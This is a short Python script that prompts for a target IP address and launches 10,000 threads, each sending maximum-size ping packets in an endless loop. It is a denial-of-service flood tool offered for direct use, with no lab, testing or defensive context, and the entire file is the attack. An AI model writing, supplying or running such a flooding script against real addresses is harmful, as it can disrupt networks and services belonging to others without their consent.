import subprocess
import threading

target_ip = input("Enter target IP")
packet_size = "65500"
thread_count = 10000 

def continuous_ping():
    # Loop forever
    while True:
        try:
            # -n 1 sends one packet, then the loop restarts immediately
            subprocess.run(["ping", "-l", packet_size, "-n", "1", target_ip], 
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception:
            break

print(f"Launching {thread_count} infinite ping threads...")

for i in range(thread_count):
    t = threading.Thread(target=continuous_ping)
    t.daemon = True
    t.start()

# This keeps the main program running so the threads don't close
try:
    while True:
        pass
except KeyboardInterrupt:
    print("Stopping...")
